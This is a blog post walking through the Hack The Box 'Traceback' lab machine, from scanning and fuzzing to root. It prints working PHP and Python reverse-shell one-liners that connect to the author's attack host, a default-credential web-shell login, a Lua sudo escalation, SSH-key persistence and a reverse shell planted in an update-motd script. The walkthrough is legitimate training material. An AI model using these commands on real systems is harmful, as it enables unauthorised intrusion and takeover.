<!DOCTYPE html>
<html lang="en" dir=>

<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This machine was challenging, but I learned a lot. I learned how to make &ldquo;smarter&rdquo; shells and how to upload the pspy script to a remote server. I wonder if I could have completed this machine without adding my public ssh key, because at the moment it is very identifiable.">
<meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="Traceback" />
<meta property="og:description" content="This machine was challenging, but I learned a lot. I learned how to make &ldquo;smarter&rdquo; shells and how to upload the pspy script to a remote server. I wonder if I could have completed this machine without adding my public ssh key, because at the moment it is very identifiable." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://stefantobler.com/posts/hack-the-box/traceback/" />
<meta property="article:published_time" content="2020-06-24T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-06-24T00:00:00+00:00" />
<title>Traceback | Stefan Tobler</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.6cd8553a6854f4812343f0f0c8baca31271e686434f381fbe3c7226f66639176.css" integrity="sha256-bNhVOmhU9IEjQ/DwyLrKMSceaGQ084H748cib2ZjkXY=">
<script defer src="/en.search.min.24f8f40c2756168e54d3c52c27896d20a0bdf40f75067c6dc1577730a766787f.js" integrity="sha256-JPj0DCdWFo5U08UsJ4ltIKC99A91BnxtwVd3MKdmeH8="></script>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-158607018-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->

  
<link rel="stylesheet" href="/assets/css/posts.css" />

</head>

<body dir=>
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      
  <nav>
<h2 class="book-brand">
  <a href="/"><img src="/images/logo.png" alt="Logo" /><span>Stefan Tobler</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>



<span><a href='https://stefantobler.com/posts/'>Recent Posts</a></span>







  



  
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="https://stefantobler.com/categories/hack-the-box">Hack the Box</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="https://stefantobler.com/categories/challenges">Challenges</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/challenges/fuzzy/" class="">Fuzzy</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/archetype/" class="">Archetype</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/magic/" class="">Magic</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/remote/" class="">Remote</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/traceback/" class="active">Traceback</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/admirer/" class="">Admirer</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li>
          
  
    <a href="https://stefantobler.com/categories/try-hack-me">Try Hack Me</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/basic-pentesting/" class="">Basic Pentesting</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/blue/" class="">Blue</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/ice/" class="">Ice</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/vulnversity/" class="">Vulnversity</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/shodan.io/" class="">Shodan.io</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li>
          
  
    <a href="https://stefantobler.com/categories/capture-the-flag">Capture the Flag</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="/posts/ctf/nahamcon_2021/" class="">Nahamcon 2021 CTF</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li>
          
  
    <a href="https://stefantobler.com/categories/misc">Misc</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="/posts/misc/docker-containerization-vs-virtualization/" class="">Docker - Containerization vs. Virtualization</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/misc/virtualbox-tutorial/" class="">How to Install Kali Linux on VirtualBox</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
  </ul>
  















</nav>




  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>


 
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Traceback</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  <nav id="TableOfContents">
  <ul>
    <li><a href="#tools">Tools</a></li>
    <li><a href="#recon">Recon</a></li>
    <li><a href="#user">User</a></li>
    <li><a href="#root">Root</a></li>
  </ul>
</nav>


  </aside>
  
 
      </header>

      
      

<div class="post-hero-container">
  <img class="card-img-top" src='/images/content/posts/hack-the-box/traceback.png'/>
</div>

<article class="markdown">
  <h1>
    <a href="/posts/hack-the-box/traceback/">Traceback</a>
  </h1>
  
  
  <div>
    
      <a href="/categories/hack-the-box/">hack-the-box</a>
  </div>
  

  
  <div>
    
      <a href="/tags/windows/">windows</a>, 
      <a href="/tags/reverse-shell/">reverse-shell</a>, 
      <a href="/tags/lua/">lua</a>
  </div>
  


  <p><p>This machine was challenging, but I learned a lot. I learned how to make &ldquo;smarter&rdquo; shells and how to upload the <code>pspy</code> script to a remote server. I wonder if I could have completed this machine without adding my public ssh key, because at the moment it is very identifiable. It was a good box tho. I look forward to my next one.</p>
<h2 id="tools">
  Tools
  <a class="anchor" href="#tools">#</a>
</h2>
<ul>
<li>nmap</li>
<li>smevk.php</li>
<li>lua</li>
<li>ssh</li>
</ul>
<h2 id="recon">
  Recon
  <a class="anchor" href="#recon">#</a>
</h2>
<p>First things first, let&rsquo;s run our <code>nmap</code> scan. I used the command <code>sudo nmap -sS -sV -p- traceback.htb</code>.</p>
<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 00:33 EDT
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 860.02 seconds
</code></pre><p>As usual with a htb machine there is a website being hosted, and it looks like the machine is pwned already. If we view the page source we can see the comment <code>&lt;!--Some of the best web shells that you might need ;)--&gt;</code>, so there might be a web shell some where. I am going to do a <code>ffuf</code> scan on the domain. The command I used is <code>ffuf -u http://traceback.htb/FUZZ -w /usr/share/dirb/wordlists/big.txt -e .html,.txt,.php,.xml</code>.</p>
<p>That did not teach us anything new, but after googling some stuff about the author&hellip; considering that he signed the first page of the web site I found a repository that he forked called <code>Web-Shells</code>. So I created a wordlist with the files in that repo and after running the command <code>ffuf -u http://traceback.htb/FUZZ -w web_shell_wordlist.txt</code>, <code>ffuf</code> found the shell <code>smevk.php</code>, unfortunately it is locked behind a login screen.</p>
<h2 id="user">
  User
  <a class="anchor" href="#user">#</a>
</h2>
<p>If we take a look at the source code for this shell in the <a href="https://github.com/Xh4H/Web-Shells/blob/master/smevk.php">GitHub repo</a> we can see that the default credentials are <code>admin::admin</code>. If we try them they work! Awesome so we got into the web shell.</p>
<p>Once we are in there is a field where we can execute a command. So let&rsquo;s create a reverse shell. First on our attacking machine use the command <code>nc -lvnp 1234</code>, then I used a <code>php</code> reverse shell because I know the server can run <code>php</code>. Here is the code I ran on the web shell <code>php -r '$sock=fsockopen(&quot;10.10.14.100&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code>. Change the IP address to what is on the IPv4 section on the access page on the HTB web site.</p>
<p>In our shell we are the user <code>webadmin</code>, let&rsquo;s navigate to this user&rsquo;s home directory by using the command <code>cd /home/webadmin</code>. In here we see a note file that reads:</p>
<pre><code>- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
</code></pre><p>I found it by using <code>sudo -l</code>. It seems there is a file called <code>/home/sysadmin/luvit</code> that we should be able to run. After a quick google search it turns out that <code>luvit</code> can be used to run <code>lua</code> scripts.</p>
<pre><code>User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
</code></pre><p>We can get some code to spawn another shell from <a href="https://gtfobins.github.io/gtfobins/lua/">here</a>. We can create the script by <code>echo</code>ing the content of the script into a file in the <code>/tmp</code> directory then running the script with <code>sudo -u sysadmin /home/sysadmin/luvit script.lua</code>. Because when we did <code>sudo -l</code> we found out that we can run <code>luvit</code> as <code>sysadmin</code> without a password. Okay so here is what I did step by step:</p>
<p>First I navigated to the <code>/tmp</code> directory, then I echoed the following code into a file called <code>script.lua</code>.</p>
<pre><code>os.execute(&quot;/bin/sh&quot;)
</code></pre><p>Then I executed the command <code>sudo -u sysadmin /home/sysadmin/luvit script.lua</code>. This throws us into another shell if we run <code>whoami</code> then we are the <code>sysadmin</code> user. But it is not that good looking, so let&rsquo;s try and make a new reverse shell from this user. I just used to command <code>nc -lvnp 9999</code> on my attacking machine then used the command <code>php -r '$sock=fsockopen(&quot;10.10.14.100&quot;,9999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code> from the ugly shell. There we go a better shell.</p>
<h2 id="root">
  Root
  <a class="anchor" href="#root">#</a>
</h2>
<p>Now let&rsquo;s get root, but first I upgraded the shell again with the command <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code>. Okay so I added my ssh public key to the <code>authorized_keys</code> file because I want to be able to reconnect fast if I mess up. This probably isn&rsquo;t advisable. This also allows me to <code>scp</code> <code>pspy</code> onto the machine to monitor the processes running. I notice that the files in the <code>/etc/update-motd.d</code> get replaced by there backups frequently. Let&rsquo;s check them out. It looks like we have permission to edit these files in the <code>update-motd.d</code> directory. Let&rsquo;s try and add some code and <code>ssh</code> into the <code>sysadmin</code> user to escalate privileges. This is a long shot, but here goes nothing.</p>
<p>First I started listening on my machine on port 9999 then I added the following code to the file <code>00-header</code>.</p>
<pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.100&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre><p>Next I had to <code>ssh</code> into the machine quickly before my script was over written. Once I <code>ssh</code> back into the machine as <code>sysadmin</code> this reverse shell was activated on my listening port. When I type <code>whoami</code>, I am <code>root</code>.</p>
</p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>

 
        
      </footer>

      
  
  <div class="book-comments">
<div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "stefantobler" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      
  <nav id="TableOfContents">
  <ul>
    <li><a href="#tools">Tools</a></li>
    <li><a href="#recon">Recon</a></li>
    <li><a href="#user">User</a></li>
    <li><a href="#root">Root</a></li>
  </ul>
</nav>

 
    </aside>
    
  </main>

  
</body>

</html>












